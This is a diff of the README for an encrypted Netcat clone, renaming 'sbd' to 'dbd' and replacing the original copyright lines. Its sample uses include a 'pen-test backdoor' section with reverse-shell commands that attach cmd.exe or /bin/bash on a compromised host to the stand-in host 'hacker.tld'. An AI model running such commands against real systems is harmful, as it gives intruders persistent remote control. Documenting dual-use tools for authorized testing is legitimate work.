@@ -1,29 +1,28 @@
+                          d8888b. d8888b. d8888b.
+                          88  `8D 88  `8D 88  `8D
+                          88   88 88oooY' 88   88
+                          88   88 88~~~b. 88   88
+                          88  .8D 88   8D 88  .8D
+                          Y8888D' Y8888P' Y8888D'
 
-                          .d8888. d8888b. d8888b.
-                          88'  YP 88  `8D 88  `8D
-                          `8bo.   88oooY' 88   88
-                            `Y8b. 88~~~b. 88   88
-                          db   8D 88   8D 88  .8D
-                          `8888Y' Y8888P' Y8888D'
-
-    Copyright (C) 2004-2005 Michel Blomgren <michel.blomgren@tigerteam.se>
-                    sbd is distributed under the GNU GPL
+    Copyright (C) 2012 Kyle Barnthouse <durandal@gitbrew.org>
+                    dbd is distributed under the GNU GPL
 
 
 SYNOPSIS
 ~~~~~~~~
 
-sbd is a Netcat-clone, designed to be portable and offer strong encryption. It
-runs on Unix-like operating systems and on Microsoft Win32. sbd features
+dbd is a Netcat-clone, designed to be portable and offer strong encryption. It
+runs on Unix-like operating systems and on Microsoft Win32. dbd features
 AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution
 (-e option), choosing source port, continuous reconnection with delay, and
-some other nice features. sbd supports TCP/IP communication only. Source code
+some other nice features. dbd supports TCP/IP communication only. Source code
 and binaries are distributed under the GNU General Public License.
 
 COMPILATION
 ~~~~~~~~~~~
 
-To compile sbd under a Unix-like operating system you need gcc and relevant
+To compile dbd under a Unix-like operating system you need gcc and relevant
 development tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others),
 type:
     $ make unix
@@ -31,9 +30,9 @@ type:
 For SunOS/Solaris, type:
     $ make sunos
 
-To compile sbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or
+To compile dbd under Microsoft Windows (NT/2K/XP/2K3) you need MinGW+MSYS, or
 Cygwin with full development support (Cygwin's MinGW gcc). To compile a native
-Win32 sbd console application under Cygwin, type:
+Win32 dbd console application under Cygwin, type:
 
     $ make win32
 
@@ -54,61 +53,61 @@ To compile a Cygwin-specific console application, type:
     $ make cygwin
 
 
-You may want to change the default behaviour of sbd. One of the most important
+You may want to change the default behaviour of dbd. One of the most important
 thing is to change the default shared secret to your own pass phrase. Edit
-sbd.h and replace with your preferences. You may, for example, want to
-hardcode a host + port to connect to if sbd is started without options.
-Complete examples are provided in sbd.h.
+dbd.h and replace with your preferences. You may, for example, want to
+hardcode a host + port to connect to if dbd is started without options.
+Complete examples are provided in dbd.h.
 
 
 SAMPLE USES
 ~~~~~~~~~~~
 
-With a little imagination, sbd can be used for many things...
+With a little imagination, dbd can be used for many things...
 
-    * Use sbd to securely transfer files between two networks:
+    * Use dbd to securely transfer files between two networks:
 
-        snafu$ sbd -l -p 12345 -k secret > output.file
+        snafu$ dbd -l -p 12345 -k secret > output.file
 
-        fubar$ cat input.file | sbd -k secret snafu 12345
+        fubar$ cat input.file | dbd -k secret snafu 12345
 
         or from win32:
-        C:\somedir>type input.fil | sbd -k secret snafu 12345
+        C:\somedir>type input.fil | dbd -k secret snafu 12345
 
-    * Use sbd as a simple (but secure) chat:
+    * Use dbd as a simple (but secure) chat:
 
-        snafu$ sbd -P snafu -Hon fubar 1234
+        snafu$ dbd -P snafu -Hon fubar 1234
 
-        fubar$ sbd -Pfubar -Hon -l -p 1234
+        fubar$ dbd -Pfubar -Hon -l -p 1234
 
-    * Use sbd as a pen-test backdoor:
+    * Use dbd as a pen-test backdoor:
 
-        C:\hacked box>sbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
+        C:\hacked box>dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
         ...
 
         or under Unix-like OSes:
 
-        root@owned# ./sbd -r1800 -Don -e /bin/bash hacker.tld 993
+        root@owned# ./dbd -r1800 -Don -e /bin/bash hacker.tld 993
 
 WARNING
 ~~~~~~~
 
-Do not pass cached input (a file with commands or similar) to a listening "sbd
--e" session. "sbd -e" is using pipes to pass data between the program being
-executed and sbd. Pipes are used (instead of plain pass-through duplicate file
+Do not pass cached input (a file with commands or similar) to a listening "dbd
+-e" session. "dbd -e" is using pipes to pass data between the program being
+executed and dbd. Pipes are used (instead of plain pass-through duplicate file
 descriptors) because of encryption between the pipes and the socket. In order
 to prevent the writing end of one of the pipes from blocking the whole
 process, I turned it into a non-blocking descriptor. There is a chance that
 when passing too much input at a time through to the -e program, it will be
 truncated (cut off) since the pipe buffer (in the OS) can't hold all of the
-data. This problem can be solved by making sbd multi-threaded for instance,
+data. This problem can be solved by making dbd multi-threaded for instance,
 but I'll avoid this as long as possible for compatibility reasons.
 
 
 LICENSE
 ~~~~~~~
 
-sbd Copyright (C) 2004 Michel Blomgren <michel.blomgren@tigerteam.se>
+dbd Copyright (C) 2012 Kyle Barnthouse <durandal@gitbrew.org>
 
 This program is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free Software
@@ -128,7 +127,7 @@ See the COPYING file for more information.
 
 --
 
-sbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe
+dbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe
 Devine <devine@cr0.net> and is distributed under the GNU General Public
 License (GPL).
 
